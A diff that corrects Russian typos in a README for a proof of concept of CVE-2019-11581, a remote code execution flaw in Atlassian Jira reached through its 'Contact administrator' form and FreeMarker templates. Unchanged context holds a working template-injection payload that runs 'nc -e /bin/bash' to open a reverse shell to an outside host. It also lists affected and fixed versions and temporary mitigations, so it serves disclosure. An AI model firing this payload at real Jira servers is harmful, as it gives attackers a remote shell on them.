@@ -1,11 +1,11 @@
 # RCE-in-Jira
 Remote code execution in Atlassian Jira(CVE-2019–11581) through template engine FreeMaker.
 
-В апреле месяце была обнаружена RCE в продукте Atlassian Confluence, а если быть точнее в плагине, который почти всегда там используется. И вот через 4 месяца еще одна RCE, но теперь уже в другом продукте Jira.
+В апреле месяце была обнаружена RCE в продукте Atlassian Confluence, а если быть точнее в плагине, который почти всегда там используется. И вот через 4 месяца еще одна RCE, но теперь уже в другом продукте - Jira.
 
 # PoC?
 Все это дело реализовывается через форму "Связаться с админом". По умолчанию он выключен, но у многих он включен.
-Jira использует компилирующий обработчки шаблонов - [FreeMaker](https://ru.wikipedia.org/wiki/FreeMarker), написанный на Java.
+Jira использует компилирующий обработчик шаблонов - [FreeMaker](https://ru.wikipedia.org/wiki/FreeMarker), написанный на Java.
 Зная это, получается сгенерировать несложный Payload.
 
 ```$i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('nc -e /bin/bash r0hack.xyz 80').waitFor()```
@@ -49,7 +49,7 @@ Jira использует компилирующий обработчки шаб
 * 8.2.x before 8.2.3 (the fixed version for 8.2.x)
 
  
-Испраленно в версиях:
+Исправлено в версиях:
 * 7.6.14
 * 7.13.5
 * 8.0.3
@@ -58,6 +58,6 @@ Jira использует компилирующий обработчки шаб
 
 Если нет возможности срочно обновится, то временным решением будет:
 * Отключить форму отправки сообщения Админам
-* Заблокировать доступ к эндпоину ```/secure/admin/SendBulkMail!default.jspa```
+* Заблокировать доступ к эндпоинту ```/secure/admin/SendBulkMail!default.jspa```
 
 ```Всем удачи!```
